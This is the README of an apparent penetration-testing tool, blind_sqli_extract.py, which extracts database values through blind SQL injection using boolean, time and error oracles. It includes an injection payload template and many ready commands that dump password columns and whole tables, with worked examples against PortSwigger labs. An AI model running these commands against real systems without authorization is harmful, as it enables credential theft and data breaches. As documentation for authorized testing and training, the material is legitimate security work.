# blind_sqli_extract.py

A blind SQL injection data-extraction tool for **authorized** penetration testing.
It recovers values from a database one character at a time using a per-character
binary search (~7 requests/char instead of ~95), and supports boolean-, time-,
and error-based oracles with automatic detection of the injection context, the
oracle type, and the backend DBMS.

> ⚠️ **Authorized use only.** Run this only against systems you own or have
> explicit written permission to test (engagement scope / rules of engagement).
> Extracting data from systems you are not authorized to test is illegal.

---

<img width="2000" height="3000" alt="image" src="https://github.com/user-attachments/assets/af323c1d-0d1e-4d2a-a880-f44b7f1ad8fb" />

---

## Table of contents

- [Requirements](#requirements)
- [Quick start](#quick-start)
- [How it works](#how-it-works)
- [Specifying the request](#specifying-the-request)
  - [From a Burp/ZAP request file (`--req`)](#a-from-a-burpzap-request-file---req)
  - [GET parameter](#b-get-parameter)
  - [POST parameter](#c-post-parameter)
  - [Cookie](#d-cookie)
  - [HTTP header](#e-http-header)
  - [JSON / raw body](#f-json--raw-body)
- [Oracle modes (`--mode`)](#oracle-modes---mode)
- [Injection context (`--context`)](#injection-context---context)
- [Backend engine (`--dbms`)](#backend-engine---dbms)
- [Enumeration](#enumeration)
  - [Multiple rows (`--rows`)](#multiple-rows---rows)
  - [Dump a whole table (`--dump`)](#dump-a-whole-table---dump)
  - [Fully interactive (`--auto`)](#fully-interactive---auto)
- [Performance & reliability](#performance--reliability)
- [Proxy & output](#proxy--output)
- [Full option reference](#full-option-reference)
- [Worked examples (PortSwigger labs)](#worked-examples-portswigger-labs)
- [Troubleshooting](#troubleshooting)
- [Limitations](#limitations)

---

## Requirements

```bash
pip install requests
```

Python 3.8+.

---

## Quick start

The most hands-off run — just point it at a saved request. `--auto` implies
`--mode auto` and `--context auto`, so it detects **oracle mode, injection
context, and DBMS** by itself, then walks you through the database:

```bash
python3 blind_sqli_extract.py --req request.txt --https --auto
```

What `--auto` resolves automatically, per blind type:

- **boolean** (response content differs) — derives the oracle from a marker,
  status code, or response length; fingerprints the engine.
- **error** (TRUE triggers a SQL error) — sweeps all engines to find the one
  whose divide-by-zero/overflow flips the response.
- **time** (response never changes) — finds the engine whose `SLEEP` delays,
  with a confirmation re-check, and forces `--threads 1` for reliability.

It tries them in that order (boolean → error → time) and stops at the first that
works.

Or a single, fully specified extraction:

```bash
python3 blind_sqli_extract.py \
    --url "https://target/product?id=1" --where param --param id \
    --mode boolean --true-marker "In stock" --dbms postgres \
    --query "SELECT password FROM users WHERE username='administrator'"
```

---

## How it works

1. **Calibrate** — sends a known-TRUE (`1=1`) and known-FALSE (`1=2`) condition
   and works out how to tell them apart (the *oracle*).
2. **Length** — binary-searches `LENGTH()` of the target value.
3. **Extract** — for each character position, binary-searches the ASCII value.
   Positions are searched in parallel across worker threads.

Payloads are built per DBMS, e.g. for boolean/string context:

```sql
' AND ASCII(SUBSTRING((<your query>),<pos>,1)) > <guess>-- -
```

---

## Specifying the request

You mark the injection point one of two ways:

- **Request file** (`--req`): put the token `*INJECT*` in the raw request where
  the payload should go.
- **Flags** (`--url` + `--where` + `--param`): the tool inserts the payload into
  the named parameter/cookie/header, or into a `*INJECT*` token in `--body`.

### A. From a Burp/ZAP request file (`--req`)

Save the request (Burp: right-click → *Copy to file*; ZAP: *Save Raw → Request*)
and insert `*INJECT*` at the injection point.

**`request.txt`:**
```http
GET /dashboard HTTP/1.1
Host: target.site
Cookie: session=abc123; TrackingId=xyz*INJECT*
User-Agent: Mozilla/5.0
```

```bash
python3 blind_sqli_extract.py --req request.txt --https \
    --mode boolean --true-marker "Welcome back!" \
    --query "SELECT password FROM users WHERE username='administrator'"
```

Notes:
- Raw requests carry no scheme — add `--https` for TLS targets.
- The whole request (method, path, headers, cookies, body) is replayed exactly;
  only the `*INJECT*` token is replaced. This is the easiest way to preserve
  auth cookies, CSRF tokens, and content-type.
- `Content-Length` is recalculated automatically.

### B. GET parameter

```bash
python3 blind_sqli_extract.py \
    --url "https://target/product" --method GET \
    --where param --param id \
    --mode boolean --true-marker "In stock" \
    --query "SELECT password FROM users WHERE username='admin'"
```

### C. POST parameter

```bash
python3 blind_sqli_extract.py \
    --url "https://target/search" --method POST \
    --where param --param q \
    --mode boolean --true-marker "results" \
    --query "SELECT password FROM users WHERE username='admin'"
```

### D. Cookie

Send the rest of the cookies unchanged with `--base-cookies`; the injectable one
is named by `--param`:

```bash
python3 blind_sqli_extract.py \
    --url "https://target/dashboard" \
    --where cookie --param TrackingId \
    --base-cookies "session=abc123" \
    --mode boolean --true-marker "Welcome back!" \
    --query "SELECT password FROM users WHERE username='administrator'"
```

### E. HTTP header

Common blind-injection sinks: `X-Forwarded-For`, `User-Agent`, `Referer`.

```bash
python3 blind_sqli_extract.py \
    --url "https://target/api/me" --method GET \
    --where header --param X-Forwarded-For \
    --mode time --delay 3 \
    --query "SELECT password FROM users WHERE username='admin'"
```

### F. JSON / raw body

Put `*INJECT*` at the exact spot inside `--body` and set `--content-type`:

```bash
python3 blind_sqli_extract.py \
    --url "https://target/api/search" --method POST \
    --where body --content-type "application/json" \
    --body '{"q":"*INJECT*","page":1}' \
    --mode boolean --true-marker '"status":"ok"' \
    --query "SELECT password FROM users WHERE username='admin'"
```

---

## Oracle modes (`--mode`)

How the tool tells TRUE from FALSE.

| Mode | Use when | Notes |
|------|----------|-------|
| `boolean` | The response **visibly changes** for TRUE vs FALSE | Fastest. Give `--true-marker`, or omit it to auto-derive from status code / response length |
| `time` | The response is **identical** regardless of the query | Uses `SLEEP`/`pg_sleep`/`WAITFOR`. Slower; auto-forces `--threads 1`; pair with `--confirm` |
| `error` | A TRUE condition can trigger a **DB error** (500 / error page) | Divide-by-zero / overflow triggers, auto-detected by status code |
| `auto` | You're **not sure** | Tries boolean → error → time, and fingerprints the DBMS + context in the same pass. This is what `--auto` uses. |

**Auto-derived oracle (no marker):** in boolean/error mode without `--true-marker`,
calibration diffs the TRUE vs FALSE responses and picks a discriminator in this
order: status code → response length → a unique line. It prints what it locked
onto, e.g. `Oracle: response length ~22 (FALSE ~13)`.

```bash
# boolean, no marker — oracle auto-derived
python3 blind_sqli_extract.py --req request.txt --https --mode boolean \
    --query "SELECT password FROM users WHERE username='admin'"

# error-based
python3 blind_sqli_extract.py --req request.txt --https --mode error --dbms postgres \
    --query "SELECT password FROM users WHERE username='admin'"

# let the tool choose
python3 blind_sqli_extract.py --req request.txt --https --mode auto --context auto \
    --query "SELECT password FROM users WHERE username='admin'"
```

---

## Injection context (`--context`)

The literal-escape used to break out of the query.

| Value | Escape | Example context |
|-------|--------|-----------------|
| `string` (default) | `'` | `... WHERE x='INJECT'` |
| `numeric` | *(none)* | `... WHERE id=INJECT` |
| `double` | `"` | `... WHERE x="INJECT"` |
| `auto` | detected | probes all three |

```bash
# numeric context (no quotes)
python3 blind_sqli_extract.py --url "https://target/item?id=1" \
    --where param --param id --context numeric \
    --mode boolean --true-marker "found" \
    --query "SELECT password FROM users WHERE username='admin'"

# auto-detect the context
python3 blind_sqli_extract.py --req request.txt --https --context auto --mode auto
```

If auto-detection fails, set the context manually or use `--prefix` / `--suffix`
to craft a custom break-out.

---

## Backend engine (`--dbms`)

`mysql` (default), `postgres`, `mssql`, `oracle`. This selects the correct
`SUBSTRING`/`SUBSTR`, `LENGTH`/`LEN`, sleep function, and comment syntax.

- With `--auto`, the engine is **fingerprinted automatically** (via a unique
  always-true function in boolean mode, or an engine-specific `SLEEP` in
  time/error mode), so you can omit `--dbms`.
- Concatenation for `--dump` differs by engine and is handled automatically
  (`||`, `CONCAT_WS`, `+`).

---

## Enumeration

### Multiple rows (`--rows`)

Extract several rows of a query using `LIMIT/OFFSET`:

```bash
# list all table names
python3 blind_sqli_extract.py --req request.txt --https \
    --mode boolean --true-marker "Welcome back!" --dbms postgres --rows 50 \
    --query "SELECT table_name FROM information_schema.tables WHERE table_schema='public'"
```

### Dump a whole table (`--dump`)

Discovers the table's columns, then dumps every row (columns concatenated with
`--sep`). Row cap comes from `--rows` (default 50).

```bash
python3 blind_sqli_extract.py --req request.txt --https \
    --mode boolean --true-marker "Welcome back!" --dbms postgres \
    --dump users --output creds.csv
```

Output:
```
[+] Columns: username, password
[+] 3 row(s) from 'users':
    username | password
    administrator~s3cr3t
```

### Fully interactive (`--auto`)

Detects the DBMS, prints version + current DB, lists tables, and prompts you at
each step: pick a table → pick columns → dump → save CSV.

```bash
python3 blind_sqli_extract.py --req request.txt --https --auto --mode auto --context auto
```

```
[+] DBMS detected: postgres
[+] Database: production
[+] Tables:
    [0] products
    [1] users
> Pick a table (number, name, or 'q' to quit): 1
[+] Columns:
    [0] username
    [1] password
> Dump which columns? ('all', or comma numbers/names): all
> Max rows to dump [50]:
> Save to CSV? (filename, or Enter to skip): creds.csv
```

---

## Performance & reliability

| Flag | Purpose |
|------|---------|
| `--threads N` | Parallel workers for character *and* row search (default 10). Used in all modes, including time. |
| `--charset SET` | Restrict the character set: `full` (default), `loweralnum`, `alnum`, `lower`, `upper`, `digits`, `hex`. Fewer chars = fewer requests/char (huge for time mode). |
| `--confirm N` | Time mode: re-check a positive result N times to reject jitter false positives (default 1). |
| `--info` | In `--auto`, also extract DB version + name. **Off by default** — these are long strings and slow, especially in time mode. |
| `--delay S` | Seconds a TRUE condition sleeps in time mode (default 3). |
| `--timeout S` | Per-request timeout (default 15; raise above `--delay`). |
| `--max-len N` | Max characters/length to probe (default 64). |

**Discovery vs. speed:** use bare `--auto` to *discover* the schema (what tables
and columns exist). Once you know the target, a **targeted `--query` is far
faster** than dumping — it puts all threads on one value's characters:

```bash
# fastest way to grab one known value in time mode (~40s vs minutes)
./blind_sqli_extract.py --req req.txt --https --mode time --dbms mysql \
    --charset loweralnum \
    --query "SELECT password FROM users WHERE username='administrator'"
```

**Speed tips (especially for time-based labs, which are inherently slow):**

- **Threading now applies to time mode too** — character positions and rows are
  extracted in parallel; `--confirm` re-checks positives to stay reliable. If you
  see a garbled character, lower `--threads` or raise `--confirm`/`--delay`.
- **Use `--charset`** when you know the format: `--charset hex` for hashes,
  `--charset loweralnum` for typical passwords. Cuts binary-search steps per char.
- **`--auto` skips version/DB extraction** by default and goes straight to the
  data. Add `--info` only if you actually want the banner.
- **Row enumeration is parallel** — the tool counts rows with `COUNT(*)` then
  extracts them all concurrently.

---

## Proxy & output

```bash
# route everything through Burp/ZAP for logging
python3 blind_sqli_extract.py --req request.txt --https \
    --proxy http://127.0.0.1:8080 --insecure \
    --mode boolean --true-marker "Welcome back!" \
    --query "SELECT password FROM users WHERE username='admin'"
```

- `--proxy URL` — send every request through an intercepting proxy.
- `--insecure` — skip TLS verification (needed with the proxy's own CA).
- `--output FILE.csv` — write extracted value(s)/rows to CSV (with a header row
  for `--dump`).

---

## Full option reference

| Option | Description |
|--------|-------------|
| `--req FILE` | Raw HTTP request file (Burp/ZAP); mark point with `*INJECT*` |
| `--https` | Use HTTPS for `--req` (raw requests carry no scheme) |
| `--url URL` | Target URL (flag-built mode) |
| `--where {param,cookie,header,body}` | Where to place the payload |
| `--param NAME` | Name of the param/cookie/header to inject |
| `--method METHOD` | HTTP method (default GET) |
| `--query SQL` | Sub-query to extract (not needed with `--auto`) |
| `--mode {boolean,time,error,auto}` | Oracle type |
| `--dbms {mysql,postgres,mssql,oracle}` | Backend engine |
| `--context {string,numeric,double,auto}` | Injection context / escape |
| `--true-marker STR` | Substring shown when TRUE (optional; auto-derived if omitted) |
| `--delay S` | Sleep seconds for time mode |
| `--confirm N` | Time mode: re-check positive results N times |
| `--prefix STR` / `--suffix STR` | Custom text around the injection |
| `--max-len N` | Max chars/length to probe |
| `--rows N` | Enumerate up to N rows via LIMIT/OFFSET |
| `--dump TABLE` | Discover columns + dump all rows |
| `--sep STR` | Separator between concatenated columns (default `~`) |
| `--auto` | Interactive detect → tables → columns → dump |
| `--threads N` | Parallel workers (default 5) |
| `--timeout S` | Per-request timeout (default 15) |
| `--proxy URL` | Route through a proxy |
| `--insecure` | Skip TLS verification |
| `--output FILE.csv` | Write results to CSV |
| `--no-calibrate` | Skip the TRUE/FALSE sanity check |
| `--body STR` | Raw body for `--where body` (use `*INJECT*`) |
| `--marker-token STR` | Injection token (default `*INJECT*`) |
| `--content-type STR` | Content-Type for `--where body` |
| `--base-cookies STR` | Cookies to send unchanged, `a=1; b=2` |
| `--header "Name: val"` | Extra static header (repeatable) |

---

## Worked examples (PortSwigger labs)

**Blind SQLi with conditional responses** (cookie, boolean, PostgreSQL):
```bash
python3 blind_sqli_extract.py --req request.txt --https \
    --mode boolean --dbms postgres --true-marker "Welcome back!" \
    --query "SELECT password FROM users WHERE username='administrator'"
```

**Blind SQLi with conditional errors** (cookie, error mode):
```bash
python3 blind_sqli_extract.py --req request.txt --https \
    --mode error --dbms oracle \
    --query "SELECT password FROM users WHERE username='administrator'"
```

**Blind SQLi with time delays and data exfiltration** (cookie, time, PostgreSQL):
```bash
python3 blind_sqli_extract.py --req request.txt --https \
    --mode time --dbms postgres --delay 3 --threads 1 --confirm 2 \
    --query "SELECT password FROM users WHERE username='administrator'"
```

**Unknown everything** (let it figure it out, then dump interactively) — works
for all four labs above without changing any flags:
```bash
python3 blind_sqli_extract.py --req request.txt --https --auto
```

---

## Troubleshooting

- **`dquote>` at the shell** — an unclosed quote in *your shell command*, not the
  tool. Put the marker string in single quotes (`--true-marker 'Welcome back!'`)
  so `!` isn't treated as history expansion.
- **Calibration fails** — the injection or oracle isn't working. Check the
  context (`--context`), the escape/quoting, the `--true-marker`, or the `--dbms`.
- **Time mode gives garbled characters** — network jitter. Raise `--confirm`,
  use `--threads 1`, and/or increase `--delay`.
- **Cookie/header payloads not landing** — the value may be URL-decoded server
  side; stacked-query payloads already URL-encode `;` as `%3B`. Confirm with a
  known TRUE/FALSE first (calibration does this automatically).
- **Wrong DBMS guessed** — pass `--dbms` explicitly, or use `--auto` which
  fingerprints by timing.

---

## Limitations

- Assumes the injection is exploitable via a standard `AND`/stacked-query
  break-out. Exotic contexts may need `--prefix` / `--suffix`.
- Out-of-band (OAST) exfiltration is **not** built in — use Burp Collaborator,
  interactsh, or `sqlmap --dns-domain` for DNS/HTTP-based OOB channels.
- No built-in WAF-evasion/tamper transforms yet.
